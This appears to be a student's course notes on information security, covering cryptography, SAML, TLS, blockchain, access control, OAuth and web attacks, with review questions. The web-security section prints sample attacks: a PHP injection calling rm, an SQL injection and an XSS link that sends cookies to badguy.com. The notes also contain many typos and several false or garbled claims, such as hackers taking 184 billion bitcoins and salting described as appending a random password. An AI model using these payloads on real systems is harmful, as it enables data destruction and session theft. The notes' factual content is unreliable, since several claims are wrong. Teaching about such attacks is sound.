# Security

## Security intro

**Information security** is the practise of preventing unauthorized access, use, disclosure, disruption, modification, recording or destruction od information.  
**Computer security** is the practise of protecting computer systems and information from theft, and unauthorized use. This practise include protecting hardware (with locks, dors etc.) and protecting software.  
**Network security** is the practise of taking physical and software preventative measures to protect the networking infrastructure from unauthorized access, malfunction, modification, destruction etc. creating a secure platform for computers, users and programs to perform their permitted functions.

![Security system](https://i.imgur.com/uzkMHlH.png)

**Cyber security** is the ability to protect and defend the use of cyberspace (a global domain consisting of interdependent network of information systems infrastructures, including the internet, embedded processors, telecommunications networks ecc.) from cyber attacks (an attack targeting an organization's use of cyberspace for the purpose of destroying, disrupting, disabling or controlling a computer infrastructure).  
**Cyber security readiness** is the ability to have critical information and tools rapidly available and in place in order to identify vulnerabilities, combat threats, deter attacks and remediate risks. The cyber security readiness improves security posture and allows the organization to remain complaint with the policy, regulations and laws.

### CIA triad

**Confidentiality** is the property that sensitive information is not discloses to unauthorized entities, preserving other entities accessing and disclose information, preserving personal privacy and proprietary information.  
**Integrity** is the property that sensitive data has not been modified or deleted in an untothorized and undetected manner. Authenticity is the property of being genuine and being able to be verified and trusted. Non-repudiation (auditability) is the protection against an individual dalsely denying having performed a particular action, this provides the capability to determine whether a given individual took a particular action such as creating information, sending a message, approving information and receving a message.  
**Availability** is a security goal that generates the requirement for protection against intentional or accidental attempts to perform unathorized deletion of data or otherwise cause a denial of service.  

### Security vs other propreties

**Reliability** addresses the consequences of accidental errors.  
**Safety** mesures the absence of catastrophic influences on the enviroment in a particular human life.  
**Dependability** is the property of a computer system such that reliance can be placed on the service it delivers.

**Vulnerabilities** is a weakness in a information system that could be exploited or triggered by a threat souce.  
**Threat** is a circumstance or event with the potential to impact organizational operations or individuals through unauthorized access, destruction, modification of information or denial of service.

**List of threats**:

- Breaking into a computer and impersonate someone I trust
- DOS attacks
- Worm is a self-replicating program that dies bit require user action to activate
- Stealing information from a computer or from communication
- Using a machine to attack others throgh emails, worms, dos attacks, spam and phishing
- Interfering with physical world: IoT, smart vehicles, power system, traffic control
**Risk** is the probability that a particular security threat will exploit a system vulnerability

![Risk matrix](https://i.imgur.com/Ikvc01f.png)

**Security Policy** is a set of rules and requirements established by an organization that governs the acceptable use of its information and services and the level and means for protecting the confidentiality, integrity and availability of its information. An example of policy is: the company's visitors must be escorted by an autorized emplyee and he must restrict them to appropriate areas. Another example is: Employees need to use a secure password on all systems and these credentials must be unique.  
**Security Mechianism** is a device or function designed to provide one or more security services usually rated in therms of strenght of service and assurance of the disign. An example is authentication: verifying the identity o user, process or device often as a prerequisite to allow access to resource in an information system. Another example is authorization that grants or denies access rights to a user, program or process.  
**Security Service** is the capability that supports one or more of the security requirements, for example key management, access control and authentication.

## Authentication I

The **user athentication** is the process of verifying a claimed user identity.  
Authentication threats:

- Spoofing: attacker starts a program that presents a fake login screen and leaves the compter
- Phishing: attacker impersonates the system to trick a user into releasing the password to the attacker

### Hash functions

It's possible to protect password with 1-way functions aka hash functions. Given a certain password it's easy to compute the hash but not in the other way.  
The requerements from an hash function are:

- **Ease of computetaion**: given a `x` input is easy to compute `f(x)`
- **Compression**: the hash are stored in a fix lenght of bits
- **One way**: given an hash `h` is computationally difficult to find an `x` input such that `h = f(x)`
- **Collision resistance**: is infeasible to find two inputs `x` and `x'`, with `x != x'` such that `f(x)=f(x')`

There are two ways of salting:

- **Basic hash functions** in which there a re wto blocks of data, and return a hash  
![Basic hash function](https://i.imgur.com/JnGWIY3.png)
- **Butterfly effect** are chained basic hash functions  
![Butterfly effect function](https://i.imgur.com/ljKzLwc.png)

Some hash functions:

- **MD4** is computationally feasible to find an input given an hash
- **MD5** has been broken
- **SHA-1** collision attacks reported
- **SHA-256** it's secure for now

A main application of hash functions is IDEA, that is the hash value of a program that is stored in a protected enviroment (for example CD-ROM) and it's used to check if a program has not been modified. To check if a program has been modified we need to recompute the hash and check if it's equal.

A main **con** of the hash functions is the birthday paradox in which given a set of `n` random chosen people will have an exponential probability in having the same birthday:

- 50% reached with 23 people
- 99.9% reached with 70 people

The only way to mitigate this attack is to create a large enough output hash so that the birthday attack becomes computationally infeasible.

**Salting** is a technique used to store password where in the (random) password is appended to a string and the password is hashed with that string.

**Single sign on (SSO)** is allows users to access multiple apps throgh a single authentication act. Good factors are usability, because only one password needs to be rememberd, secure because the tokens needs to be complex, usabile because you can get shared sessions. The cons is the security, because only one password need to be compromised.  
A famouse SSO protocol is SAML 2.0.

![Assurance levels](https://i.imgur.com/AIUbfyg.png)

**Contextual authentication** is where the context around the user's login are considered and assessed (valutate) to then decide whether the person is who the say they are. If there's a chance they are not, then an appropriate action is taken. For example if I'm logging in a new computer in a place where I've never been, more steps in my authentication needs to be required and a notification should be sent to me.

### Single sign on (SSO)

SSO advantages:

- reducing password fatigue from different user name and password combinations
- reducing time spent re-entering passwords for the same identitry
- reducing IT cost due to lower number of calls to help desk about passwords

SSO types:

- in a **pseudo-SSO** the client sofware manages the credentials and hides the login from the user
- in a **proxy-based SSO** there is a proxy in the network that manages user credentials and hides te login details from the client
- in a **true SSO** the user authenticates to a separate authentication service
- in a **federated sso** is an authentication between administrative domains

The main **disadvantage** of SSO is the only a password needs to be compromised to get access to serveral apps/services.  

### Questions authentication

- What is authentication?
- What is a hash function?
- What is salting?
- What is a brute force guessing attack? How can it be mitigated?

## Authentication II

### SAML (Security assertion markup language)

In order to access more than one service providers at a time, an **identity provider** in which the user has more trust can authenticate the user and allow him to use more than one service at a time.

![SAML](https://i.imgur.com/mhjxvDU.png)

SAML is used in the context a a **trust relashionship** between the parties.  
SAML is an XML-based framework for communicating user authentication and attribute information. The advantages are:

- **platform neutrality** because it abstracts the security framework and it's secure indipendently from the architecture
- **loose coupling of directories** because it does not require user information to be mantained and syncd between directories
- **improved online experince for end users** because it enables single sign-on so allowing users to make a single login to an entity provider and then accessing more service providers wihout additional authentication
- **reduced administrative costs and risks for service provides** because it allows to reuse a single act of authentication multiple times across multiple services and the burden is transferred to the identity provider

The goals of SAML are:

- **creation of a trusted security statements** like A address is `admin@admin.com` and was authenticated using a password so has access to the resurce B
- **exchange of security statements** A is authenticated and wants to buy B, he shoudn't reauthenticate before buying B

![SAML use case](https://i.imgur.com/yOWoCEF.png)

![SAML with authz](https://i.imgur.com/daBjBpE.png)

### SAML overview

![SAML overview](https://i.imgur.com/jBFIFOx.png)

A **SAML assertion** is a package of informations supplying one or more statements made by a SAML authority, for example authentication, attributes and authorization decisions.  
A **SAML protocol** specify the request/response protocols. This protocols can for example: requests that an identiry provider authenticate a principal and return corresponding assertion, request than the use of an identifier is terminated, request than a name identifier is registered.  
A **SAML binidind** is a mapping from SAML to a normal communication protocol for example HTTP.  
A **SAML profile** defines constrains in support of the standard protocols allowing flexibility, for example it can define how to use the authentication request/response like HTTP redirect, HTTP post etc.
The **SAML metadata** defines the actors involed in the various profles, for example SSO identiry providers, SSO service providers, SSO attribute authority and SSO requester.  
The **SAML authentication context** contains details of a additional informations that need to be added to the request, for example a multi-factor authentication can be included.

Another standard is **XACML** (eXtensibleAccess Control Markup Language) which descrives both access control policy language and request/response language.

### Web SSO

![Web SSO](https://i.imgur.com/5s682gn.png)

The two main scenarios of web SSO are identity provider initiated SSO and service provider initiated SSO.
The **identity provider SSO** works such that the user connects to `idprovider.com`, authenticates and than he's redirected to `serviceprovider.com`.  
A way more common scenatio is **service provider-initiated SSO** in which the user once is connected to `serviceprovider.com`, than the user get redirected to `useridentity.com`, makes the login and get redirected back.  

![idp initiated SSO](https://i.imgur.com/DX8ULxc.png)

![sp initiated SSO](https://i.imgur.com/UHSrikA.png)

### SAML security

In order to provide security to the connection is strongly suggested to use the PKI from the identity provider to the service provider, in order to avoid man in the middle attacks. So to keep message integrity and confidentiality SSL/TLS is raccommanded.

### Questions authentication II

- What are the goals of SAML?
- What is the structure of a SAML assertion?
- What is a SAML profile? Give an example of SAML profile.
- What is the difference between IdP-Initiated and SP-Initiated Web SSO?
- What is the flow of an IdP-Initiated Web SSO?
- What is the flow of an SP-Initiated Web SSO?
- What are the main security concerns underlying the deployment of SAML? What are the main mitigations measures?
- What is SPID? What is eIDAS? Is there a relationship between the two?
- Give an example of scenario in which eIDAS is useful.

## Cryptography

**Cryptography** is the science and study of secret writing.  
**Cryptoanalysis** is the science and study of methods of breaking ciphers.  
**Cryptology** cryptography and cryptoanalysis.  

Security services provided by cryptographic mechanism are:

- **Data confidentiality** encryption algorithms hide the content of messages
- **Data integrity** is a check function that detect whether a document has been changed
- **Data origin authenitication** is a digital signature algorithms that provides the means to verify the source and integrity of the message

A cryptosystem is a 5-tuple where:

- **E** is an enctyption algorithm
- **D** is a decryption algorithm
- **M** is the set of plaintexts
- **K** is the set of keys
- **C** is the set of cyphertexts

So `M x K = C` and `C x K = M`.  

A **key** is an input to a cryptographic algorithm used to obtain confidentiality, integritym authenticity or other proprety over some data. Keys are store in safe places like tmp, secure co-processor, smartcards etc.  

### Key distribution

The two partied need to share the same key and the key must be protected from access by others, the streanght of any cryptographic system depends on the key distribution technique.  
A encryption scheme is secure if the cost of breaking the cipher exceeds the value of the encrypted information and the time required to break it exceeds the useful lifetime of the information. It's difficult to estimate the amount of effort required to cryptoanalyze cipthertext successfully if you are trying with mathematical schemas. With bruteforce in average you try half of the possible combinations.

The essence of encryption is:  
`Encrypt(key,plaintext)=ciphertext`  
`Decrypt(key,ciphertext)=plaintext`  
Algorithm is public, key is private.

The essence of cryptograpy is to use a public algorithm and a private key.  
There are two types of tranformation in encryption: the **substitution** in which each element in the plaintext is mapped into another element, and the **trasposition** in which the elements in the plaintext are rearranged (same letters, different orfer).  
The **Caesar cipher** is the algorithm in using substitution that shifts a fixed number of letter of the alphabet. There are 2 ways to break it: the brute force attack trying all the 25 possibilities or trying to see the distribution of the letters (vocals and consonants) inside the text.  

### Symmetric key encription

**Symmetric key** cryptography use the same key to crypt and decrypt: `D(k,E(k,p))=p`.  
![Symmetric key](https://i.imgur.com/WbNRmM2.png)

The **main problem** of SKC is that both of the parties have the same keys, compared to PKC which doesn't.

**Stream ciphers** encrypt sequences of short data blocks under a changing key system, security relies on design on the key stream generator and typical block length is 1 bit/byte.  

**Block ciphers** encrypt sequences of long data blocks without changing the key, it has a typical length of 64/128/256/512 bits. A block cipher breaks the message in successive blocks M1, M2, M3, ..., Mn and enciphers each Mi with the same key k. DES (data encryption standard) and AES (advanced encryption standard) are well-known examples of block cipher systems.

**DES** employ a 56-bit key that operates on 64-bit blocks, is a deterministic algorithm operating on a block cipher. DES has 16 rounds. DES has been cracked in 1998 with a large number of Deep-Crack chip, taking less than 3 days to find a 56-bit by searching a total of 17,902,806,669,197,312 keys, calculating an average of 88,000,000,000 keys per second.

**AES** is the successor of DES, it uses a symmetric key criptography scheme designed for 128, 192 and 256 bits.

### Public key cryptograpy (PKC)

**Public key cryptograpy** uses two different keys: a 2 public keys and 2 private keys when talking about two clients.  

![Asymmetric key](https://i.imgur.com/yEojFdE.png)

The basic idea behind the PKC (Public key cryptograpy) is that a user has the public key that uses to encrypt a message and another user has a private key that uses to decrypt the message.  
An example is:

- Alice encypt the message using Bob's public key
- Bob decypt Alice message with his private key

This propreties are offered:

- **Authentication** because the digital signature says a message is created by a known sender
- **Non-repudiation** because the sender cannot deny having sent the message
- **Integrity** beacuse message was not altered while transiting

The main **pro** about public key cryptography is that the private key is only know by the owner and does not need to be shared like in Simmetric key encryption.  
The main **cons** are:

- the algorithms are 2-3 orders of magnitude slower than those for symmetric key encryption
- it's not possible to ensure that the we are exchanging the keys with the real person (and man in the middle attacks are possible)

A possible mitigation with this last problem can with the digital signatures ([Digital signatures paragraph](#digital-signatures)).

### RSA

The **RSA** (Rivest, Shamir, Adleman) uses a PKC algorithm for key exchange, digital signature and key encryption of small blocks of data.  
RSA uses a variable size encryption block and a variable size key. Key-pair is deliverd from a very large number `n` that is the product of two prime numbers `primeNumber1*primeNumber2=n` chosen according to special rules:

- Primes may be 100 or more digits in length
- An attacker cannot determine the prime factors of `n` from this information alone and this is what makes the RSA algorithm so secure
- If a large number is created from two prime factors that are roughly the same size there is no known factorization algorithm that will solve the problem in a seasonable amount of time

![Factorization difficulty](https://i.imgur.com/3XRlf2Q.png)

A recent **vulnerability of RSA** has been discovered beacuse chips inside identity cards, programmable smartcards, authentication tokens ecc. were using common software libraries in which was possible to compute the private key of a 1024 and 2048 key lenght. This was possible due to a algorithmic vulnerability characterized by a specific structure of the generated RSA prime numbers. So it was possible to crack a 1024 bits key with the cost of $76 and $40.000 for 2048 bits.

### Diffie-Hellman

**DH** (Diffie-Hellman) is another algorithm that uses PKC used for secret-key key exchange only (not authentication or digital signatures). Diffie-Hellman allows to two parties that have no prior knoledge of each other to generate a private key through an unsecure channel. This key will be used to encrypt subsequent communication using a symmetric key cipher.  

How DH works:

![DH overview](https://i.imgur.com/535jhl7.png)

**Problem of Diffie-Hellman**: does not provide authentication, because parties do not know who they are establishing a key with, so man in the middle attack is possible.

### Questions RSA

- What is a cryptosystem?
- Why key management is crucial for cryptography?
- What does it mean for a cryptographic technique to be computationally secure?
- What are substitution and transposition ciphers? Given an example for each one.
- What is symmetric cryptography?
- What are block and stream ciphers?
- Why is DES deprecated?  Why is AES still used?
- What is asymmetric (or public key) cryptography?
- What are the main advantages and disadvantages of symmetric and asymmetric cruptography?
- What is RSA and for what it can be used?
- What is Diffie-Hellman and for what it can be used?
  - What is a possible attack to Diffie-Hellman?
- What is a one-way function?
  - What is the one-way function used in RSA?
  - What is the one-way function used in Diffie-Hellman?

## Digital signatures

The main problem that digital signatures have (with diffie-hellman key exchange) brings is that we are not sure with how we are exchanging they keys with. The solution to this are digital certificates.

### Digital certificates

A digital certificate is issued and signed by a trusted third party (TTP) than can be rappresented e.g. by a person or a service.

![Certificate schema](https://i.imgur.com/M7Qqbry.png)

A digital certificate works with the public key infrastructure.  
The main components of the PKI are:

- the **root certificate authority** (CA) is the most significat element in the CA hierarchy and authorizes suborfinate CAs
- the **subordinate CA** is responsible for issuing certificates
- the **registration authority** (RA) is responsible for accepting requests for digital certificates and authenticating the entity (client or server) making the request
- the **certificate revocation list** (CRT) is pubblished list of certificates that have been revoked
- the **validation authority** is an entity that provides a service used to verify the validity of a digital certificate

![Digital signature exchange](https://i.imgur.com/aa516QJ.png)

Creation of a digital certificate:

- User generates a public and private key-pair or it's assigned by an authority
- User requests the certificate by some authority in their organization
- CA responds with its certificate (signed by its private key)
- User gathers all information required by the CA server to ortain its certificate (e.g. mail, password, fingerprint)
- User sends a certificate request to the CA consisting of her public key and he additional informations
- CA gets the request, verifies the identity and generates the certificate for User, bindind its identity with its public key
- CA issues the certificate to User

### SSL and TLS

**Secure sockets layer** (SSL) now at the version SSLv3.  
**Transport layer security** (TLS) now at the version 1.3.

TLS consists of two main protocols: handshake protocol and record protocol.

- **handshake protocol** that uses PKC to establish a shered secret key between the client and the server
- **record protocol** which uses the private key (provided by the handshake protocol) to protect communication between the client and the server

### Handshake protocol

Handshake protocol work with Diffie-Hellman exchange and the flow is:

- **Client Hello** contains
  - the version of the protocol 0the client want to use
  - cipher suite (set of algorithms that help secure the connection)
- **Server Hello** contains
  - the chosen protocol version (supported by both)
  - cipher suite (supported by both)
  - session id: an generated value that will identify the connection
- Step 3 contains
  - **certificate** if the client requests a cetificate, server will send a X.509 certificate
  - **server key exchange** is a key that will be used to generate the master secret key
  - **certificate request** is a request that the server can make if it requires the client to be authenticated
- Step 4
  - **certificate** if the server requests a cetificate, client will send a X.509 certificate
  - **client key exchange** is a key that will be used to generate the master secret key
  - **certificate verify** is a message that provides explicit verification of the client certificate
- Step 5
  - **cipher spec** is a message sent by both parties consisting of a byte set to 1
  - **hash generation** of the entire handshake ans sent by both parties
- Step 6-7 is the exchange encypted messages using shared keys

![handshake protocol](https://i.imgur.com/eO1gM8J.png)

The usage of SSL and TLS ensures **data integrity** if the CiptherSpec in the channel uses a suitable hash algorithm.

There are **security isses** in TLS up to v1.2 which are:

- **backward compatibily** with the old protocol which uses weak cipther suites and broken hash functions
- **logical flows** that can be used to trick both client and server

Some TLS attacks are:

- tree attack
- **3shake** in which the mallory mediates two handshakes that generate the same master secret
- **sweet32** is a birthday attack in which an host negotiate a cipher called 3DES which can make a collision happen in `2^32` combination, nowadays fairly easy to generate, fix (TLS v1.3) is to disable 3DES  
- **CRIME** used deflate compression to injects different characters into the victim’s requests trying to guess the content, fix (TLS v1.3) disable compression

### Questions digital signatures

- What are the advantages and disadvantages of Symmetric and Asymmetric Cryptography?
- How can PKC be used to sign messages?
- What is the role of hash functions in this process?
- What is a digital certificate and what are its main components?
- What is the Public Key Infrastructure (PKI) and which are its main entities?
- What is SSL/TLS? Where is it used?
- How does the handshake protocol of TLS work?
- What is the role of Diffie-Hellman technique?
- What are the potential security problems of TLS?

## Blockchain

A blockchain is a data structure like linked lists. The blocks are connected each other and each block has the hash of the previous block.  

The blocks usually have:

- index
- time stamp
- data like description
- hash
- hash of the previous block

![Blockchain structure](https://i.imgur.com/Q3Lzxil.png)

The hash of the previous block is kept to garantee the **integrity** of the blockchain. So everyone that is modifying any peace of data in the blockchain will invalidate the chain.  
Anyway everyone could just recompure all the hashes and change all the hashes to have a valid chain, so to avoid this we need to make the computation very expensive and this computation is called **Proof of work (PoW)**. PoW is an algorithm in which is very expensive to get results but it's easy to verify.  
An exaple can be find a number that concatenated to a string gives a hash beginning with a sequence of 4 zeros.  

The **blockchain data structure** is not stored in one place, it is distributed without a central authority. And the chain is stored in various places thanks to the consensus algorithms.  
The **consensus algoritm** is also used to garantee the reliability of nodes that may be unreliable when considered in isolation, it checks if more than 50% of the nodes says a block has been modified.

![Paradigim shift](https://i.imgur.com/jPBbUjF.png)

The differences from financial networks and bitcoin is that the API of the first are closed (trying to keep the bed actors outside) and the API of bitcoin are open. The the financial networks protect their security is by having a model "trust by exclusion" and bitcoin has the model "trust by computation".  

The **API** of bitcoin offers services such as: checking balance in a wallet, creating a transaction, creaing a new wallet etc.

The bitcoin blockchain it's built on a scripting language that defines transactions. Most of the scripts are like "Transfer X from A to B", but the language can create **smart contract**.  

### Blockshain trust

In bitcoin there is the smart contract that are pieces of code that are given to the people that certifies the transactions. There have been bugs exploited, in bitcoins an hacker took 184 billion bitcoins and ethereum 541.000 eth.  

### Double spending problem

In bitcoin there are public and private keys. There is a problem in bitcoin beacuse if a person tries to send 2 or more bitcoin to 2 or more people.

![bitcoin double spending](https://i.imgur.com/VWkEAso.png)

In bitcoin this is solved beacause each person keeps track of the others transaction with an **accouning ledger**.

![bitcoin double spending fix](https://i.imgur.com/9iJbsO6.png)

But it's not enough to solve that.
There is a similar problem that's conceptally similar, called Byzantine generals problem.

![Byzantine problem](https://i.imgur.com/ZmVL4XW.png)

Simplified version of the Byzantine problem is the Two generals problem: General 1 is the leader, General 2 is the follower. Each general’s army on its own is not enough to defeat the enemy army successfully, thus they need to cooperate and attack at the same time.
In order for the two generals to communicate and decide:

- General 1 has to send a messenger across the enemy’s camp that will deliver the time of the attack to General 2
- There is a possibility that the messenger will get captured by the enemies and thus the message will not be delivered resulting in General 1 attacking while General 2 not

Even if the first message goes through, General 2 has to acknowledge that he received the message, so he sends a messenger back, thus repeating the scenario where the messenger can get caught. This extends to infinite chains of acknowledgements with generals unable to reach agreement.

The byzantine problem is well known on systems inside airplane angine systems, nuclear power and any system whose actions depends on the results of a large number of sensors.

The existing algoritm **solves** the problem under the assumtion that only 1/3 of the nodes involved can be failing.

The byzantine problem is solved by bitcoin using Proof-of-Work.

![Blockchain double spending problem](https://i.imgur.com/2oFgIoy.png)

### Proof-of-work

Since there is not central authorithy in blockchain a ledger is elected to decide the content of the next block to be added to the data structure.
In the Proof-of-work approach the first one that solves a computationally difficult puzzle will be the ledger, the only way to solve that problem is by bruteforcing the solutions.  
The main feature of Proof-of-work is that the actor that solves the puzzle first gets rewarded with some currecy (transaction fees or block reward).  
The other nodes just verify that the hash is correct.

Example:

![Proof of work example](https://i.imgur.com/ewr7SHx.png)

### Distributed ledgers

Because the transactions per second that can be made in bitcoin are only 5 (compared to 1,700 in thr Visa system) there are scalability problems. For this reason the **distributed ledgers** are a solution to this problem.

### Questions blockchain

- Describe the structure of the blockchaindatastructure
- Why are digital signatures important in blockchain? What kind of problem they solve?
- What is the double spending problem? How can it be solved?
- What is the Byzantine General Problems and why is it relevant for the blockchain?
- What is the Proof-of-Work approach to solving the consensus problem?
- What is the different between a blockchainand a distributed ledger?
- Explain the terms public, private, permission-less and permissioned

## Access control I

![Access controll](https://i.imgur.com/WzjfpRA.png)

### Least privilege

The **subject** is anyone allowed to access a resource (also a program). A **user** is a human being.  
In a device or network the user should always have the least priviledges needed.  
The **principle of least priviledge** says that every subject must be able to access only the information and resources that are necessary for its legitimate purpouse.  

### Access control

Access control is the process of processing requests to access resources and data of a system and determing if a request should be granted or denied.  
The security of a system is defined in terms of a policy. A **policy** is a set of rules to implement specific security properties, and it is including CIA (confidentiality, integrity, availablibity).

The three main points of access control are:

- **policy** that is a set of rules that control what actions a sucbject can perform
- **model** is a mathematical rappresentation of the policy
- **enforcement** is the low level (software and hardware) in which the models are implemented

A **problem with enforcement** was that commands were maximum 256 chars and the rest of the string was executed in the cpu. This was a old problem, but still most of the programmers are careless of the size of the input.

### Access control matrix

The access controll matrix is a matrix that contains the resurces and subjects in the rows and cols, then it each cell contains the access that this subject has: own, read, write.

![Access matrix](https://i.imgur.com/CwmPia7.png)

There are two extensions: access control list and capabilities list.

### Capabilities list

**Capabilities list** is a way to store the rights that a user have and stored listing the subjects and attached the resources that he has the possibility to access.

The main cons about this is that changing the status of the rights of a certain resource (for example deny all users the access to this program) can be difficult to find which users have acess to that resorce.

The **confused deputy** is the privilege escalation attack in which the user that does not have directly access to a certain resource is able to overwrite certain resouces tricking the system.  

### DAC/MAC/RBAC

The **discretionary access control** is the model in which can give rights to other subjectes.  
The **mandatory access control** enforces mandatory rules.  
The **role base access control** is considered superior.

### Discretionary access control (DAC)

The **discretionary access control** there is no central entity that can give access to a certain resource, only the owner can give access read/write/... permissions to its own resources. Ususally for this it's used ACLs.  
The **pros** of discretionary access control is that it's flexible, the implementation is not hard and it is intuitive.  
The **cons** are that it's vulneravle to trojans and information leakage.  

### Mandatory access control (MAC)

The **mandatory access control** is the opposite, a central authority that decides how a certain resource should be shared.  

In **multi-level security** we are classifing information labeling them in more importance increasing categories. When a resource is added to the system is labled and if a resouce contain both not import and important informations, it's labeled as important (the gighest grade).  
This organization needs to reflex the **principle of least priviledge** in which every user is given the least permission needed.  
In multi-level secuity we are following two main properties: **not read up** in which a user that does have the permiossions to read a more important resource, cannot read it and **no write down** in which a user that has the possibility to lower the grade of a resource cannot.  

The **pros** of MAC are: is not vulneravle to trojans beacuse of the no write doen property, it's rigid so it's easy to keep the situation under control.  
The **cons** is that information leakage are still possible by convert channel (the path of communication between systems).  

Where DAC and MAC are not adequate?
DAC and MAC are not adequate when talking about repetion of user labels. Here the RBAC comes.

### Role based access control (RBAC)

![RBAC](https://i.imgur.com/dJP9W3R.png)

Roles are not the same thing as group: the groups are a collection of user, the role is a collection of users and a collection of permissions.

![RBAC example](https://i.imgur.com/RFnp5E1.png)

**RBAC pros**:

- it's easy to understand the idea of roles
- it's easy to tell through roles which user has which role

**RBAC cons**:

- can be difficult to associate users to roles
- role meaning can change over time and the roles can be not up to date

### Access control I questions

- What is access control and what is its basic architecture?
- What is an access control matrix? ACLs? Capabilities?
- What is DAC?
- What is MAC? Define No Read Up and the No Write Down principles.
- What are the differences, advantages and disadvantages of DAC and MAC?
- What is RBAC? How does it simplify administration?
- Define the Principle of Least Priviledge
- What is a confused deputy?
- What is a trojan?
- What is a covert channel?  How can a covert channel be created in MAC?
- How access control can mitigate command injection attacks?

## Access control II

### OAuth 2.0

The **OAuth 2.0** is a delegation protocol that lets users allow applications to access resources on their behalf.

***From now OAuth refers to Oauth 2.0***

The main problem that OAuth solves is the permissions that you are giving to an external entity is unlimited, with OAuth you can limit it.

The **flow of OAuth** is:

- **authentication** when you authenticate to the OAuth provider (not part of OAuth protocol)
- **user consent** when user decides what can be shared with the 3rd party app, the OAuth token will be created thanks to that
- the **OAuth token** will be recevied by the application
- The service can **access resources** from your profile/account

The **OAuth token** is opaque to clients, for example a token is `92dv2038f06dba95d0c5f1951ac5b5eb`.  
Along with the token, the first time that the token is generated it's also issued the **refresh token** that is a token used to generate a new token when the one that has been created is released.  
The OAuth scope contains: the type of actions can do (read, write, delete), resource that can access, time of access in which it will expire.

The security consideration we need to think about are:

- use short-lived access tokens and long-lived refresh tokens
- when a token is expiring the the client has to run the reauthorization process again to get a new access token
- when a token is stolen it cannot be used outside of a certain application
- when there is not access token a refresh token ask for credentials

OAuth tokens are similar can be managed with DAC and MAC but increasing the size of the users or sesources the operation can become comutationally expensive.  
It can be solved with RBAC (as Google does) assigning the permissions to roles in the organization instead of directly to users.  
This approch can be difficult when considering that a metadata of a file cannot be considered inside this schema.  
For this reason there are the ABAC.

### Attribute based access control (ABAC)

**Attribute based access control** (ABAC) have the possibilities to give access based on:

- user attributes
  - name
  - organization
- attributes associated with the resource to be accessed
  - title
  - author
  - date of creation
- enviromental condition (one or more)
  - current date
  - current hacker activities
  - network security level

An example is to allow users who `are employees` can access `payroll system` only `during business hours`.

Compared to RBAC examples can be:

- RBAC: give access to all teachers to Google
- ABAC: give access to all teachers to Google while they are working in school A teaching B

### XACML

The **eXtensibleAccess Control Markup Language** (XACML) language is an XML encoded language that can specify access congtrol policies, access control reqiest and access control decisions.  

The main components of XACML are:

- **XACML policy language** that specify access control rules
- **XACML request/response protocol** used to query a decision
- **XACML reference architectures**

XACML can be combined with RBAC and ABAC. The main takeaways of SAML are the attributes that are not taken in consideration. The main takeaways of ABAC are that it can become hard to control and take decisions if there are a lot of clashing attributes.

### Questions access control II

- What is the problem solved by OAuth? Which entities are involved in Oauth?
- What are the main flows supported by OAuth? In which use case scenarios should they be used?
- What is an OAuth token? Is it opaque for which entity involved in OAuth?
- What is ABAC? What is an ABAC policy? What are the advantages of ABAC over RBAC?
- What is XACML? What is a XACML target, effect, condition, rule policy, and policy set? What are the XACML policy combining algorithms?
- Describe the XACML architecture

## Web application security

When tying to check if a computer is alive you can send a ping that is usually 64 bytes but in IPv4 it's possible to send ping up to `2^16` (65,535) bytes.  
A **ping of death** is a set of well-formed fragmented packets that when are reassembled by the server, the malformed packets make the system crash and injection is possible.  

Because HTTP is stateless, there is the need of **cookies** to keep track of the connection.

### Cookies connection

![Cookies connection](https://i.imgur.com/Zoqz2cL.png)

### Web application security for real

**Web application security** deals with security of websites, web applications and web services. Meanwhile **Allication security** specifically is focused in imporving application security by finding, fixing and preventing security vulnerabilities.

![Different types of attacks](https://i.imgur.com/pKW1hGa.png)

Some types of web threats are:

- **web atacker** can for example take control of a website
- **network attacker** can make dns poisoning and wireless eavesdropper
- **malware attacker** can take control of an OS

The **goals of web security** are: safely browse the web (confidentiality and integrity), support secure web apps and support secure mobile apps.

### Injection attack

Them most dangerous attack in terms of risk is the **injection attack**. Is consist of executing arbitrary code on the server.
An example in PHP is using the eval stement and executing code:

```PHP
$ans= 10 ; system(`rm*.*’)
```

which leads to esase all the system data.

Another common exaple is **SQL injection** in which the attacker injects some code to a  SQL query like:

``` SQL
SELECT * FROM Person WHERE UserId= 105 OR 1=1;
```

in this case the SQL query is asking not only to match the UserID but also `1=1` that is always true.

One possible way to solve these problem is to check everytime the input that's passed to the server to avoid that a person can be alble to make something like this.

### Cross-site scripting (XSS)

**Cross-site scripting** enables attacker to inject client-side scripts into web pages as JavaScript from a website to access that site's cookies.

An example of XSS attack is to make the victim open the link

``` URL
http://victim.com/search.php? term = <script> window.open( “http://badguy.com?cookie= ” + document.cookie) </script>
```

When in the website that the victim is opening the website contains:

``` HTML
<BODY>Results for <?php echo $_GET[term] ?> : ... </BODY>
```

An important mitigation to the Universal-XSS (U-XSS) attacks is to have the same-origin policy in which the origin is defined as URI scheme, host name and port number.  

A **mitigation for XSS** attacks is to never trust the client side and filter always the input.

### Phishing attacks

The **phishing attacks** are attacks in which the user get unsuspecting emails composed to make the user discose informations or visiting websites in order to gain access to thir identities.  

**Phishing attack countermesures** are:

- make the certificate authority check the authenticity of the website
- browsers canblock suspicious websites
- educate people in detecting these attacks
- make prople checking if the email has personal informations
  - spear phishing is the attack in which the attacker has personal informations

### Web application security questions

- What is web application security?
- For which kind of security threats found in web applications, TLS is not an adequate countermeasures?
- Which kind of attackers threaten web applications?
- What is an injection attacks?  Give at least two examples of such an attack.
- What is a CSRF attack? Give a high level description of how to mount it.
- What is a XSS attack? Give a high level description of how to mount it.
- What is a Phishing attack? Give a high level description of how to mount it.
- What are the main mitigation measures for injection attacks? And for CSRF attacks? And For XSS attacks? And for Phishing attacks?

## Publish-Subscription Communication

The publish-subscribe communication consist of:

- the **pubblisher** that produce data in for of an event
- the **subscriber** that declare interest on pubblished data with subscription
- the **event notification system** notifies each subscriber the pubblished events

### Message Queue Telemetry Transport (MQTT)

**Message Queue Telemetry Transport** (MQTT) is a lightweight messagging protocol that is designed to minimise the network bandwidth and it's based on the publish subscribe communication.  
This protocol is designed to fit the machine to machine (M2M) and IOT world.  

In the MQTT protocol the subscription mechanism can be organized in topics, for example livingroom or temperature.

In MQTT the security standards that can be implemented are the credentials and SSL. The problem with SSL is that the procol has been created to be lightweight and this make everything going way slower.

![MQTT](https://i.imgur.com/GpRzGMF.png)

Some possible attacks can be made like brute force attack because there is no mechanism to stop them.

## Privacy and data protection

The first main definition of privacy is **informational delf-determination** that means that everyone gets to control information about himself or herself.  
The second definition of privacy is **high-level og difficulty in correlating data and actions** and means to remain anonymous.

**Data anonymization** means to remove personal identifying information like name, phone number and email.

